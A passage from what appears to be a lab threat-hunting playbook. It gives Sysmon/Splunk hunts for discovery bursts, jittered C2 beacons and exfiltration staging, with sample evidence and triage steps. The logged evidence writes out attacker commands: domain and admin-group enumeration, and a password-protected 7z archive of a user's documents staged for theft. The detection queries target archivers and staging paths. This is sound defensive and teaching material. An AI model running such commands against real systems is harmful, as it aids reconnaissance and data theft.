2026-11-20T15:05:11Z-15:09:48Z WIN-LAB01, User LAB\jsmith — 7 tools in under 5 minutes:
whoami /all · ipconfig /all · systeminfo · nltest /dclist:LAB · net group "Domain Admins" /domain · arp -a · qwinsta
Baseline: jsmith ran zero of these in the prior 30 days; the lab admin account runs 1-2, singly, during maintenance.
Indicator: the sequence is the syllabus of an intrusion (identity, network, domain controllers, admin group, sessions) — and it sits exactly between initial access (14:58, HUNT-02) and the LOLBIN download (15:22, HUNT-01) on the timeline.
items.triage:
1. Reconstruct the full command list in order; it tells you what the actor was looking for and what they likely did next (here: Domain Admins enumeration precedes the Project 2 cross-host attacks).
2. Check the same user for discovery on other hosts — discovery usually repeats per foothold.
3. Correlate the following hour for the actions discovery enables: new logons, share access (5145), remote execution.
4. If the burst is an admin, it will match a ticket and their normal host; document it and add to the baseline, do not just close it.
5. Keep this as a hunt, not a paging rule: medium severity, reviewed in the weekly hunt queue, unless combined with HUNT-02/03 hits for the same user.
items.fp: FPs: helpdesk troubleshooting and IT onboarding run exactly these tools. The discriminators are breadth (>= 4 distinct tools), speed (minutes, not a workday), the account's own baseline, and company (a discovery burst from an account with a rare-binary or Office-shell hit is not a helpdesk call). Single discovery commands are never alerted on.

items.title: Beacon hunting with jitter: regular outbound connections that dodge the interval rule
items.src: Sysmon Event ID 3 (Network Connect) + DNS Event ID 22 / firewall outbound logs
items.logic:
HYPOTHESIS: Project 2's INV-05 caught a metronome beacon (every ~5 min). A jittered beacon (interval randomized +/- 40%) defeats the fixed-interval search — so hunt the statistics instead: many connections to one rare destination, low byte variance, from one process, over hours.
index=sysmon EventCode=3 Initiated=true
| stats count AS conns, avg(bytes) AS avg_payload, stdev(interval_s) / avg(interval_s) AS jitter_ratio, dc(DestinationHostname) AS dns_names BY Computer, Image, DestinationIp, DestinationPort
| where conns >= 12 AND jitter_ratio < 0.6
| where NOT DestinationIp IN (known_update_and_telemetry_nets)
items.ev:
Result: WIN-LAB01, explorer.exe -> 198.51.100.23:8443
26 connections over 3 hours, mean interval 6m 50s, jitter ratio 0.41 (randomized, so INV-05's exact-5-minute pattern missed it), payload 380-460 bytes each, zero DNS queries for the destination (hard-coded IP).
Attribution note: the process is explorer.exe only because of the HUNT-05 injection at 16:41 — hunting the process name alone would have cleared this as shell traffic.
Indicators: rare destination (1 host on the fleet), statistical regularity under jitter, tiny uniform payloads, DNS-less connection, off-hours span.
items.triage:
1. Identify the true originating code, not just the process name: check HUNT-05 injection results for the same host/window before trusting a system process.
2. Measure first-seen for the destination and align it with the incident timeline; a beacon that starts after initial access is C2 until proven otherwise.
3. Block the destination and watch for interval or destination changes (failover behavior confirms a live operator/implant).
4. Extract the destination, port, and timing profile as IOCs for Project 5 enrichment and fleet-wide retro-hunt.
5. Graduate carefully: the jitter-ratio query becomes a scheduled hunt (hourly), not a real-time alert — it needs hours of data by design.
items.fp: FPs: update checkers, cloud sync, and telemetry also connect regularly — but to DNS-resolved vendor domains, from signed binaries, on many hosts at once. Rarity (single-host destination) plus DNS-less plus post-compromise start time is the combination that convicts. Expect this hunt to take hours of telemetry; a 15-minute window proves nothing either way.

items.title: Exfiltration staging: archives and staging folders before data leaves
items.src: Sysmon Event ID 1 (archivers) + Event ID 11 (FileCreate) / file auditing on staging paths
items.logic:
HYPOTHESIS: The ransomware storyline (Project 3) may not be the actor's only goal. Theft-first actors stage data before encrypting: a burst of file reads across document folders, an archiver (7z, rar, zip) writing one large archive into Temp/Public, then an outbound transfer. None of Projects 1-3 looked for collection at all.
index=sysmon EventCode=1 Image IN ("*\\7z.exe", "*\\rar.exe", "*\\WinRAR.exe") OR (Image="*\\powershell.exe" CommandLine="*Compress-Archive*")
| table _time, Computer, User, Image, CommandLine
/* paired with: */ index=sysmon EventCode=11 TargetFilename IN ("*.7z", "*.rar", "*.zip") TargetFilename IN ("*\\Temp\\*", "*\\Users\\Public\\*", "*\\ProgramData\\*") | where file_size > 50MB
items.ev:
2026-11-20T22:47:19Z WIN-LAB01 Sysmon EventID=1
Image: C:\Program Files\7-Zip\7z.exe (legitimate installed tool, abused)
CommandLine: 7z.exe a -p C:\Users\Public\docs.7z C:\Users\jsmith\Documents\* C:\Users\jsmith\Desktop\* -mx=3
Sysmon EventID=11: C:\Users\Public\docs.7z created, 412 MB, password-protected (-p flag)
Followed 22:52 by explorer.exe (injected, HUNT-05) opening an outbound session to 198.51.100.23 — assessed as the staged archive leaving before the 23:38 ransomware sequence in Project 3.
Indicators: user-document scope, staging path, password protection, size, and timing hours before encryption — the double-extortion pattern (steal first, encrypt second).
items.triage:
1. Assume the staged data left if an outbound session followed: scope the breach by the archive's source folders, not by what was encrypted.
2. List exactly which files the archiver read (Sysmon 11 / file auditing around the window) for the exposure assessment.
3. Preserve the archive if it still exists (it is both evidence and the definitive list of what was taken).
4. Check for earlier, smaller staging runs — actors test the path with a small archive first.
5. Hand the destination and archive hash to Project 5; flag the double-extortion finding clearly in the incident record, because it changes notification duties.
items.fp: FPs: users legitimately zip folders for email and backup, and IT archives logs.
